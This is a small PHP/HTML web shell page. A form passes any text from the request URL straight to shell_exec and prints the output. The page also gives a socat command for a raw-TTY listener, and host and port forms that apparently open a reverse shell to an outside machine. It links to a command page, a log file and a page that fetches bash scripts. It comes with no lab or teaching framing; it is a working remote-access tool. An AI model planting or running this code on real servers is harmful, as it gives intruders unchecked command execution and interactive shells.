<form action="/">
  <input type="text" placeholder="command" name=" ">
  <button type="submit">submit</button>
</form>
<pre>
<?php
  $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "=", 1)+1);
  $cmd = urldecode($cmd);
  $cmd = $cmd === "" ? "echo hello" : $cmd;
  echo shell_exec($cmd." 2>&1");
?>
</pre>
<br>
<a href="/cmd_noblock.php">cmd no block</a><br>
<a href="/log.txt">log file</a><br>

conn socat:<br>
<pre>
socat file:`tty`,raw,echo=0 tcp-listen:[port]
</pre>
<form action="/socat.php">
  <input type="text" placeholder="host" name="host">
  <input type="text" placeholder="port" name="port">
  <button type="submit">submit</button>
</form>
<br><br>
<a href="/init.php">get my bash scripts</a>
